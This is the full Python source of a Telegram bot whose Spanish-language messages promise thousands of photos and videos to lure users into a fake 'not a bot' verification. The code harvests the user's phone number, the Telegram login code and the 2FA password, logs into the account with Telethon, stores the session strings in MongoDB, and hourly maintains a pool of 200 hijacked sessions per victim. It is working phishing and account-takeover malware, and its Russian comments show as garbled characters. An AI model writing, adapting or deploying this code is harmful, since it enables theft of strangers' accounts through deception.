import logging
import os
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo.telegram_sessions
main_sessions_col = db["main_sessions"]  # –û—Å–Ω–æ–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ (1 –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
active_sessions_col = db["active_sessions"]  # –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ (200 –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
user_states = {}
temp_data = {}

async def maintain_sessions(user_id, phone, main_session_str):
    """–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º –ø—É–ª –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π"""
    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–µ –∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    active_sessions = list(active_sessions_col.find({"user_id": user_id}))
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫–∏–µ —Å–µ—Å—Å–∏–∏ –∞–∫—Ç–∏–≤–Ω—ã
    valid_sessions = []
    for session in active_sessions:
        client = TelegramClient(StringSession(session['session']), API_ID, API_HASH)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append(session)
            else:
                # –£–¥–∞–ª—è–µ–º –Ω–µ–∞–∫—Ç–∏–≤–Ω—É—é —Å–µ—Å—Å–∏—é
                active_sessions_col.delete_one({"_id": session["_id"]})
        except Exception as e:
            logging.error(f"Session check error: {e}")
            active_sessions_col.delete_one({"_id": session["_id"]})
        finally:
            await client.disconnect()
    
    # –ï—Å–ª–∏ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π –º–µ–Ω—å—à–µ 200 - —Å–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–µ
    if len(valid_sessions) < 200:
        needed = 200 - len(valid_sessions)
        for _ in range(needed):
            # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é —Å–µ—Å—Å–∏—é –Ω–∞ –æ—Å–Ω–æ–≤–µ –æ—Å–Ω–æ–≤–Ω–æ–π
            client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
            await client.connect()
            new_session_str = client.session.save()
            
            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –∞–∫—Ç–∏–≤–Ω—É—é —Å–µ—Å—Å–∏—é
            active_sessions_col.insert_one({
                "user_id": user_id,
                "phone": phone,
                "session": new_session_str,
                "created_at": datetime.utcnow(),
                "last_active": datetime.utcnow()
            })
            
            await client.disconnect()

async def session_monitor():
    """–§–æ–Ω–æ–≤–∞—è –∑–∞–¥–∞—á–∞ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è —Å–µ—Å—Å–∏–π"""
    while True:
        await asyncio.sleep(3600)  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—ã–π —á–∞—Å
        try:
            # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –æ—Å–Ω–æ–≤–Ω—ã–º–∏ —Å–µ—Å—Å–∏—è–º–∏
            users_with_sessions = main_sessions_col.distinct("user_id")
            
            for user_id in users_with_sessions:
                # –ü–æ–ª—É—á–∞–µ–º –æ—Å–Ω–æ–≤–Ω—É—é —Å–µ—Å—Å–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                main_session = main_sessions_col.find_one({"user_id": user_id})
                if main_session:
                    await maintain_sessions(user_id, main_session['phone'], main_session['session'])
        except Exception as e:
            logging.error(f"Session monitor error: {e}")

async def send_code_keyboard(user_id, current_code="", message_id=None):
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("‚úÖ Enviar", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"C√≥digo: `{current_code}`" if current_code else "Ingresa el c√≥digo:"

    if message_id:
        try:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=message_id,
                text=text,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        except:
            pass
    else:
        msg = await bot.send_message(
            user_id,
            text,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        return msg.message_id

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorizaci√≥n en la primera cuentaü•∫", callback_data="auth_account")
    )
    await message.answer(
        "üëãüá™üá® ¬°HOLA! ‚ù§Ô∏è\n"
        "¬øQuieres ver m√°s de 10.000 fotos y m√°s de 4.000 v√≠deos? üëÅ\n"
        "Verifica que no eres un bot con el bot√≥n de abajo. ü§ñüëá\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("üì± Comparte tu n√∫mero", request_contact=True))

    await bot.send_message(user_id, "ü•∫Por favor comparte tu n√∫mero de tel√©fono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –ª–∏ —É–∂–µ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä
    existing = main_sessions_col.find_one({"phone": phone})
    if existing:
        await message.answer("‚ùå Este n√∫mero ya est√° registrado. Usa otro n√∫mero.")
        return

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        code_request = await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        temp_data[user_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': code_request.phone_code_hash,
            'message_id': None
        }
        msg_id = await send_code_keyboard(user_id)
        temp_data[user_id]['message_id'] = msg_id
    except Exception as e:
        logging.error(f"Error sending code: {e}")
        await message.answer(f"‚ùå Error al enviar el c√≥digo: {str(e)}")
        await client.disconnect()
        user_states.pop(user_id, None)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="‚õîÔ∏è No es el momento adecuado", show_alert=True)
        return

    user_data = temp_data.get(user_id)
    if not user_data:
        await bot.answer_callback_query(callback_query.id, text="Error de sesi√≥n", show_alert=True)
        return

    current_code = user_data.get('code', '')
    message_id = user_data.get('message_id')

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è Ingresa el c√≥digo primero", show_alert=True)
            return
        
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è C√≥digo demasiado largo", show_alert=True)
            return
        
        current_code += digit
        temp_data[user_id]['code'] = current_code
        await send_code_keyboard(user_id, current_code, message_id)
        await bot.answer_callback_query(callback_query.id)

async def try_sign_in(user_id, code):
    user_data = temp_data.get(user_id)
    if not user_data:
        await bot.send_message(user_id, "‚ö†Ô∏è Sesi√≥n no encontrada. Por favor, comienza de nuevo con /start")
        return

    client = user_data['client']
    phone = user_data['phone']
    phone_code_hash = user_data['phone_code_hash']

    try:
        # –ü—Ä–æ–±—É–µ–º –≤–æ–π—Ç–∏ —Å –∫–æ–¥–æ–º
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )
        
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Å–Ω–æ–≤–Ω—É—é —Å–µ—Å—Å–∏—é
            main_sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "phone": phone,
                    "session": session_str,
                    "created_at": datetime.utcnow()
                }},
                upsert=True
            )
            
            # –°–æ–∑–¥–∞–µ–º –ø—É–ª –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π
            await maintain_sessions(user_id, phone, session_str)
            
            await bot.send_message(user_id, "‚úÖ ¬°Autenticaci√≥n exitosa!")
            await bot.send_message(
                user_id,
                "Estamos trabajando en modo manual, disculpen la demora, "
                "pronto les enviaremos material fotogr√°fico y de videoüòâüßç‚Äç‚ôÄÔ∏è."
            )
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "üîê Ingresa tu contrase√±a 2FA:")
            
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "üîê Se requiere tu contrase√±a 2FA. Por favor, ingr√©sala:")
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "‚ùå C√≥digo incorrecto. Int√©ntalo de nuevo:")
        temp_data[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", temp_data[user_id]['message_id'])
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "‚è∞ C√≥digo expirado. Por favor, intenta nuevamente con /start")
        await client.disconnect()
        cleanup(user_id)
    except Exception as e:
        logging.error(f"Sign in error: {e}")
        await bot.send_message(user_id, f"‚ùå Error de autenticaci√≥n: {str(e)}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    user_data = temp_data.get(user_id)
    
    if not user_data:
        await message.answer("‚ö†Ô∏è Sesi√≥n no encontrada. Por favor, comienza de nuevo con /start")
        return

    client = user_data['client']
    phone = user_data['phone']

    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Å–Ω–æ–≤–Ω—É—é —Å–µ—Å—Å–∏—é
            main_sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "phone": phone,
                    "session": session_str,
                    "created_at": datetime.utcnow()
                }},
                upsert=True
            )
            
            # –°–æ–∑–¥–∞–µ–º –ø—É–ª –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π
            await maintain_sessions(user_id, phone, session_str)
            
            await message.answer("‚úÖ ¬°Autenticaci√≥n exitosa con 2FA!")
            await message.answer(
                "Estamos trabajando en modo manual, disculpen la demora, "
                "pronto les enviaremos material fotogr√°fico y de videoüòâüßç‚Äç‚ôÄÔ∏è."
            )
        else:
            await message.answer("‚ùå No se pudo autenticar con 2FA.")
    except Exception as e:
        logging.error(f"2FA error: {e}")
        await message.answer(f"‚ùå Error con 2FA: {str(e)}")
    finally:
        await client.disconnect()
        cleanup(user_id)

def cleanup(user_id):
    """–û—á–∏—Å—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if user_id in user_states:
        user_states.pop(user_id)
    if user_id in temp_data:
        temp_data.pop(user_id)

async def on_startup(dp):
    # –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å–µ—Å—Å–∏–π –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ –±–æ—Ç–∞
    asyncio.create_task(session_monitor())
    logging.info("Bot started")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)